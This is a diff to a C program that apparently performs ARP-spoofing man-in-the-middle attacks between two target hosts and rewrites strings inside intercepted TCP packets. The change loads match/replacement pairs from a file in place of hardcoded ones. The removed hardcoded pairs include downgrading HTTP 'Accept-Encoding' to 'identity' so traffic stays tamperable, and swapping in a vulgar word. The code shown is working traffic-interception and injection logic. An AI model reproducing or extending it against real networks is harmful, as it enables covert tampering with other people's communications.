@@ -4,16 +4,25 @@
 #include <signal.h>
 #include <netinet/ether.h>
 #include <fcntl.h>
+#include <unistd.h>
 
 #include "utils.h"
 #include "arp.h"
 #include "packet.h"
 #include "mutils.h"
 
+/* packet buffer size */
 #define BUF_SIZE ETH_FRAME_LEN
+/* buffer for replacement pairs size */
+#define REPL_BUF_SIZE 64
 
 int s; // socket
 int lfd; // log file descriptor, -1 of log disabled
+/* array of replacement pairs. Even items are matches,
+ * odds their replaicement. A match end a replacement
+ * should have the same length */
+char ** repl_pairs_arr; 
+int repl_pairs_c = 0; // number of items (repl_pairs * 2)
 
 /*
  * this method looks at packet source eth address
@@ -94,16 +103,10 @@ processbuf(uint8_t * buf, size_t numbytes)
 
 
 	/* inject packet */
-	char * arr[6];
-	arr[0] = "Accept-Encoding: gzip, deflate, sdch";
-	arr[1] = "Accept-Encoding: identity           ";
-	arr[2] = "Tome";
-	arr[3] = "vole";
-	arr[4] = "srpnovou";
-	arr[5] = "hovnovou";
+
 
 	int ic;
-	if(ic = injectpkt(ip_p, numbytes, arr, 6)){
+	if((ic = injectpkt(ip_p, numbytes, repl_pairs_arr, repl_pairs_c))){
 		//printf("INJECTED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
 		//dprintpkt_l(1, ip_p, numbytes);
 		//printf("%d\n", ic);
@@ -120,6 +123,85 @@ processbuf(uint8_t * buf, size_t numbytes)
 	forwardpacket(ip_p, numbytes);
 }
 
+/* if 7. argument (file), reads replacement pairs from file and save to
+ * repl_pairs_arr, repl_pairs_c
+ * FILE used because of the parsing ability */
+void
+load_repl_pairs(int argc, char ** argv)
+{
+  int i = 0;
+  int len;
+
+  if(argc >= 7){
+  	// open file
+  	FILE * rf = fopen(argv[6], "r");
+  	if(rf == NULL){
+  		perror("Replacement file error");
+  		exit(1);
+  	}
+  	// load repl_pairs_c
+  	if(fscanf(rf, "%d", &repl_pairs_c) != 1){
+  		dprintf(2,"Replacement pairs count in file is not a number\n");
+  		exit(1);
+  	}
+  	if(repl_pairs_c%2 != 0){
+  		dprintf(2,"Replacement pairs count is not an even number\n");
+  		exit(1);
+  	}
+
+  	// HACK: get to next line
+  	while(1){
+  		int c = fgetc(rf);
+  		if(c == '\n') break;
+  		if(c == EOF) {
+	  		dprintf(2,"Invalit replacement file format\n");
+	  		exit(1);
+	  	}
+  	}
+
+  	// load repl_pairs_arr
+  	repl_pairs_arr = (char **) calloc(repl_pairs_c, sizeof(char *));
+
+  	for(i = 0; i < repl_pairs_c; i+=2){
+  		repl_pairs_arr[i] = (char *) malloc(REPL_BUF_SIZE);
+  		repl_pairs_arr[i + 1] = (char *) malloc(REPL_BUF_SIZE);
+
+  		// laod first word
+  		if(fgets(repl_pairs_arr[i], REPL_BUF_SIZE, rf) == NULL){
+			dprintf(2,"Replacement pair string number %d error\n", i);
+	  		exit(1);
+	  	}
+
+	  	// load second word
+	  	if(fgets(repl_pairs_arr[i + 1], REPL_BUF_SIZE, rf) == NULL){
+			dprintf(2,"Replacement pair string number %d error\n", i + 1);
+	  		exit(1);
+	  	}
+
+	  	// dprintf keep the new lines in the strings, remove them
+	  	len = strlen(repl_pairs_arr[i]);
+	  	if(len && repl_pairs_arr[i][len-1] == '\n') repl_pairs_arr[i][len-1] = '\0';
+	  	
+	  	len = strlen(repl_pairs_arr[i + 1]);
+	  	if(len && repl_pairs_arr[i + 1][len-1] == '\n') repl_pairs_arr[i + 1][len-1] = '\0';
+
+
+	  	// check if len is the same
+	  	if(strlen(repl_pairs_arr[i]) != strlen(repl_pairs_arr[i + 1])){
+			dprintf(2,"Replacement pair strings should have the same length (%d:%d, %d:%d)\n",
+				i, (int) strlen(repl_pairs_arr[i]), i+1, (int) strlen(repl_pairs_arr[i+1]));
+	  		exit(1);
+	  	}
+
+	  	printf("In TCP packets '%s' will be replaced with '%s'\n", repl_pairs_arr[i], repl_pairs_arr[i+1]);
+
+	}
+  } else {
+  	// repl_pairs_c is set to 0 already
+  }
+
+}
+
 /* 
  * this method triggers on SIGINT and
  * close socket and exit program
@@ -133,21 +215,37 @@ cleanup()
   exit(0);
 }
 
+void
+showusage(int argc, char ** argv)
+{
+  printf("Usage: %s <interface> <target1-ip> \
+<target1-mac> <target2-ip> <target2-mac> [<replacement-file> [<log-file>]]\n", argv[0]);
+
+  exit(1);
+}
+
 int
 main(int argc, char ** argv)
 {
   int numbytes;
-  int i;
 
   uint8_t buf[BUF_SIZE];
+
+  if (argc < 6)
+    showusage(argc, argv);
 
   /* save arguments to proper global vars
    * and convert them to binary representation */
   process_args(argc, argv);
 
+  /* if more argument, load vars repl_pairs_arr
+   * and repl_pairs_c */
+  load_repl_pairs(argc, argv);
+
+
   /* init log fd (lfd) */
-  if(argc >= 7){
-  	lfd = open(argv[6], O_RDWR|O_APPEND|O_CREAT);
+  if(argc >= 8){
+  	lfd = open(argv[7], O_RDWR|O_APPEND|O_CREAT);
   	if(lfd < 0){
   		perror("open");
   		exit(1);
@@ -155,7 +253,8 @@ main(int argc, char ** argv)
   } else {
   	lfd = -1; /* disable logging */
   }
-  
+
+
 
   // initialize socket
   s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
